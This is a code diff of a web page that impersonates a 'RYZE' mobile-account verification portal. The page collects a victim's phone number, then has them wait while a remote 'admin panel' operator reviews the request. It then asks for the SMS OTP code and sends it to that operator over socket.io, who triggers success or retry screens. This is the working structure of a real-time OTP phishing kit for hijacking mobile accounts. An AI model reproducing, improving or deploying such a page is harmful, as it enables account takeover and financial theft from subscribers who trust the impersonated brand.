@@ -10,21 +10,33 @@
         .hidden { display: none; }
         .ryze-bg { background: radial-gradient(circle at top right, #1a1a40, #0a0a12); }
         .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fadeIn { animation: fadeIn 0.3s ease-out forwards; }
     </style>
 </head>
-<body class="ryze-bg min-h-screen flex items-center justify-center font-sans text-white p-4">
+<body class="ryze-bg min-h-screen flex flex-col items-center justify-center font-sans text-white p-4">
 
-    <div id="app-card" class="glass p-8 rounded-3xl shadow-2xl w-full max-w-md border-t-4 border-blue-500">
-        <div class="text-center mb-10">
-            <h1 class="text-5xl font-extrabold tracking-tighter text-blue-500 mb-2">RYZE</h1>
-            <p class="text-gray-400 text-sm uppercase tracking-widest">Security Portal</br>Verification Gateway</p>
+    <!-- Information Icon (Top Right) -->
+    <button onclick="toggleInfo()" class="fixed top-6 right-6 bg-blue-600/20 hover:bg-blue-600/40 p-3 rounded-full border border-blue-500/50 transition-all z-40">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+    </button>
+
+    <!-- Main Card -->
+    <div id="app-card" class="glass p-8 rounded-3xl shadow-2xl w-full max-w-md border-t-4 border-blue-500 relative">
+        
+        <!-- Logo Header -->
+        <div class="flex flex-col items-center mb-10">
+            <img src="public/RYZE.png" alt="RYZE" class="w-32 h-auto mb-2">
+            <p class="text-gray-400 text-xs uppercase tracking-[0.2em]">Verification Gateway</p>
         </div>
 
-        <!-- Step 1: Phone & Purpose Input -->
+        <!-- Step 1: Phone & Purpose -->
         <div id="step-phone">
             <div class="mb-5">
                 <label class="block mb-2 text-xs font-semibold text-gray-400 uppercase">Choose Purpose</label>
-                <select id="purpose" class="w-full p-4 rounded-xl bg-[#0a0a1a] border border-gray-700 focus:border-blue-500 outline-none transition appearance-none cursor-pointer">
+                <select id="purpose" class="w-full p-4 rounded-xl bg-[#0a0a1a] border border-gray-700 focus:border-blue-500 outline-none appearance-none cursor-pointer">
                     <option value="" disabled selected>Select an option</option>
                     <option value="Marge BL to RYZE">Marge BL to RYZE</option>
                     <option value="Marge RYZE to BL">Marge RYZE to BL</option>
@@ -34,55 +46,83 @@
 
             <div class="mb-8">
                 <label class="block mb-2 text-xs font-semibold text-gray-400 uppercase">Mobile Number</label>
-                <input type="tel" id="phone" placeholder="01XXXXXXXXX" class="w-full p-4 rounded-xl bg-[#0a0a1a] border border-gray-700 focus:border-blue-500 outline-none transition text-lg tracking-wider">
+                <input type="tel" id="phone" placeholder="01XXXXXXXXX" class="w-full p-4 rounded-xl bg-[#0a0a1a] border border-gray-700 focus:border-blue-500 outline-none text-lg tracking-wider">
             </div>
             
-            <button onclick="sendData()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg shadow-blue-900/20">
+            <button onclick="sendData()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-bold transition shadow-lg shadow-blue-900/20">
                 Continue Verification
             </button>
         </div>
 
         <!-- Step 2: Waiting -->
         <div id="step-waiting" class="hidden text-center py-10">
-            <div class="relative w-20 h-20 mx-auto mb-6">
-                <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
-                <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-            </div>
+            <div class="animate-spin h-12 w-12 border-4 border-blue-500 border-t-transparent rounded-full mx-auto mb-6"></div>
             <h3 class="text-xl font-medium mb-2">Verifying Details...</h3>
-            <p id="wait-msg" class="text-gray-400 text-sm px-4">আপনার রিকোয়েস্টটি অ্যাডমিন প্যানেলে পাঠানো হয়েছে। দয়া করে কিছুক্ষণ অপেক্ষা করুন।</p>
+            <p id="wait-msg" class="text-gray-400 text-sm px-4">আপনার রিকোয়েস্টটি অ্যাডমিন প্যানেলে পাঠানো হয়েছে। অনুগ্রহ করে অপেক্ষা করুন।</p>
         </div>
 
         <!-- Step 3: OTP Input -->
         <div id="step-otp" class="hidden">
-            <div class="text-center mb-6">
-                <span class="bg-yellow-500/10 text-yellow-500 text-xs py-1 px-3 rounded-full font-bold uppercase tracking-widest">Action Required</span>
-            </div>
             <p class="text-center text-gray-300 mb-6">আপনার মোবাইলে প্রাপ্ত OTP কোডটি এখানে প্রদান করুন।</p>
             <input type="number" id="otp" placeholder="Enter OTP" class="w-full p-4 rounded-xl bg-[#0a0a1a] border border-blue-500/50 focus:border-blue-500 outline-none mb-6 text-center text-3xl font-bold tracking-[10px]">
-            <button onclick="sendOTP()" class="w-full bg-green-600 hover:bg-green-700 p-4 rounded-xl font-bold transition shadow-lg shadow-green-900/20">Submit OTP</button>
+            <button onclick="sendOTP()" class="w-full bg-green-600 hover:bg-green-700 p-4 rounded-xl font-bold transition shadow-lg">Submit OTP</button>
         </div>
 
-        <!-- Status Popup -->
-        <div id="status-popup" class="hidden fixed inset-0 flex items-center justify-center bg-[#0a0a12]/95 backdrop-blur-sm z-50">
-            <div class="glass p-10 rounded-3xl text-center max-w-xs border border-white/10">
-                <div id="status-icon" class="text-6xl mb-6 scale-110"></div>
-                <h2 id="status-title" class="text-2xl font-bold mb-3"></h2>
-                <p id="status-desc" class="text-gray-400 text-sm mb-8 leading-relaxed"></p>
-                <button onclick="location.reload()" class="bg-blue-600 text-white px-10 py-3 rounded-full font-bold hover:bg-blue-700 transition">Return Home</button>
-            </div>
+        <!-- Developer Buttons -->
+        <div class="mt-10 pt-6 border-t border-white/5 flex flex-col gap-3">
+            <a href="https://www.facebook.com/your-facebook-link" target="_blank" class="w-full bg-[#1877F2]/10 hover:bg-[#1877F2]/20 text-[#1877F2] text-center p-3 rounded-xl text-sm font-semibold transition border border-[#1877F2]/20">
+                Follow Developer
+            </a>
+            <a href="https://your-profile-website.com" target="_blank" class="w-full bg-white/5 hover:bg-white/10 text-white text-center p-3 rounded-xl text-sm font-semibold transition border border-white/10">
+                Developer Profile
+            </a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="mt-8 text-gray-500 text-[10px] uppercase tracking-widest text-center">
+        All Rights reserved by Tnayem48 | dev.
+    </footer>
+
+    <!-- Info Popup Modal -->
+    <div id="info-modal" class="hidden fixed inset-0 flex items-center justify-center bg-[#0a0a12]/95 backdrop-blur-md z-50 p-6">
+        <div class="glass p-8 rounded-3xl max-w-sm border border-blue-500/30 animate-fadeIn">
+            <h2 class="text-blue-400 font-bold mb-4 flex items-center gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                    <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
+                </svg>
+                সতর্কতা ও পরামর্শ
+            </h2>
+            <p class="text-xs text-gray-300 leading-relaxed mb-6">
+                বাংলালিংক প্রধান অ্যাকাউন্ট ব্যালেন্স এবং নিয়মিত ইন্টারনেট, মিনিট, এসএমএস, মিক্স বান্ডেল প্যাক (অবশিষ্ট ব্যালেন্স এবং মেয়াদ সহ) স্বয়ংক্রিয়ভাবে RYZE-তে স্থানান্তরিত হবে, সীমাহীন, OTT স্ট্রিমিং, দীর্ঘ মেয়াদ (৩০ দিনের বেশি) এবং প্রচারমূলক/ক্যাম্পেইন প্যাকগুলি ছাড়া, যা পরিবর্তনের পরে বন্ধ হয়ে যাবে।<br><br>
+                <strong>দ্রষ্টব্য:</strong> আপনি RYZE থেকে বাংলালিংক প্রিপেইড প্যাকেজগুলিতে ফিরে যেতে পারবেন না।
+            </p>
+            <button onclick="toggleInfo()" class="w-full bg-blue-600 p-3 rounded-xl font-bold">বুঝেছি</button>
+        </div>
+    </div>
+
+    <!-- Final Status Popup -->
+    <div id="status-popup" class="hidden fixed inset-0 flex items-center justify-center bg-[#0a0a12]/95 backdrop-blur-sm z-50">
+        <div class="glass p-10 rounded-3xl text-center max-w-xs border border-white/10">
+            <div id="status-icon" class="text-6xl mb-6"></div>
+            <h2 id="status-title" class="text-2xl font-bold mb-3"></h2>
+            <p id="status-desc" class="text-gray-400 text-sm mb-8"></p>
+            <button onclick="location.reload()" class="bg-blue-600 text-white px-10 py-3 rounded-full font-bold">Return Home</button>
         </div>
     </div>
 
     <script>
         const socket = io();
 
+        function toggleInfo() {
+            const modal = document.getElementById('info-modal');
+            modal.classList.toggle('hidden');
+        }
+
         function sendData() {
             const phone = document.getElementById('phone').value;
             const purpose = document.getElementById('purpose').value;
-            
-            if(!purpose) return alert("অনুগ্রহ করে উদ্দেশ্য (Purpose) সিলেক্ট করুন");
-            if(phone.length < 11) return alert("সঠিক মোবাইল নম্বর দিন");
-
+            if(!purpose || phone.length < 11) return alert("সঠিক তথ্য দিন");
             socket.emit('send_phone', { phone, purpose });
             showStep('step-waiting');
         }
@@ -95,34 +135,21 @@
             showStep('step-waiting');
         }
 
-        socket.on('show_otp_input', () => {
-            showStep('step-otp');
-        });
-
-        socket.on('retry_phone', () => {
-            alert("আপনার রিকোয়েস্টটি রিজেক্ট করা হয়েছে। দয়া করে সঠিক তথ্য দিন।");
-            showStep('step-phone');
-        });
+        socket.on('show_otp_input', () => showStep('step-otp'));
+        socket.on('retry_phone', () => { alert("রিজেক্ট করা হয়েছে!"); showStep('step-phone'); });
 
         socket.on('final_status', (data) => {
             const popup = document.getElementById('status-popup');
-            const title = document.getElementById('status-title');
-            const icon = document.getElementById('status-icon');
-            const desc = document.getElementById('status-desc');
-
             popup.classList.remove('hidden');
             if(data.status === 'success') {
-                title.innerText = "Success!";
-                icon.innerText = "🛡️";
-                desc.innerText = "আপনার ভেরিফিকেশন সফলভাবে সম্পন্ন হয়েছে। RYZE পোর্টালে আপনার সেশন একটিভ করা হয়েছে। এখন আপনি RYZE অ্যাপ প্লেস্টোর থেকে নামিয়ে স্ট্যাটাস চেক, ইন্টারনেট ক্রয় সহ সকল AI features ব্যবহার করতে পারবেন ।";
+                document.getElementById('status-icon').innerText = "🛡️";
+                document.getElementById('status-title').innerText = "Success!";
+                document.getElementById('status-desc').innerText = "ভেরিফিকেশন সফল হয়েছে।";
             } else {
-                title.innerText = "Invalid OTP";
-                icon.innerText = "⚠️";
-                desc.innerText = "আপনি ভুল OTP প্রদান করেছেন। অনুগ্রহ করে সঠিক কোডটি পুনরায় ইনপুট দিন।";
-                setTimeout(() => {
-                    popup.classList.add('hidden');
-                    showStep('step-otp');
-                }, 4000);
+                document.getElementById('status-icon').innerText = "⚠️";
+                document.getElementById('status-title').innerText = "Failed";
+                document.getElementById('status-desc').innerText = "ভুল OTP প্রদান করা হয়েছে।";
+                setTimeout(() => { popup.classList.add('hidden'); showStep('step-otp'); }, 3000);
             }
         });
 
